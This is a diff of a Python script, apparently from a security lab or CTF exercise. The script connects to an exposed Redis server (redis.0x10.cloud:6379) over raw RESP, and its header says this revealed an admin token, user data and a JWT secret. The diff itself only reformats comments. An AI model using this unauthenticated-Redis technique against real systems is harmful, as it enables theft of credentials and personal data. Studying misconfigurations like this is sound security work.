@@ -7,7 +7,10 @@
 #  DESCRIPTION
 #  
 #   Redis db is publicly accessible.
-#   I used the RESP (redis serialization protocol) to communicate #   with the Redis server. Throughout the communication process by #   running some commands (ping, key, get, set), I was able to find #   that some responses returned that I could access the admin 
+#   I used the RESP (redis serialization protocol) to communicate 
+#   with the Redis server. Throughout the communication process by 
+#   running defined commands (ping, key, get, set), I was able to find
+#   that the responses returned that I could access the admin 
 #   token, user data, and a secret jwt key.
 #
 # ============================================================
@@ -18,8 +21,10 @@ print("=" * 50)
 print("     PUBLICLY ACCESSIBLE REDIS")
 print("=" * 50)
 
+
+# This function formats the commands to a redis readable format (RESP).
+# It establishes a communication with the redis server, sends the command, gets the response and closes the connection.
 def send_redis_command(command):
-    # Format the commands to a redis readable format (RESP)
     command_parts = command.split()
     cmd = f"*{len(command_parts)}\r\n"
 
@@ -27,7 +32,6 @@ def send_redis_command(command):
         part = str(part)
         cmd += f"${len(part)}\r\n{part}\r\n"
     
-    # Establish communication with the server
     try:
         sock = socket.create_connection(("redis.0x10.cloud", 6379))
         sock.sendall(cmd.encode())
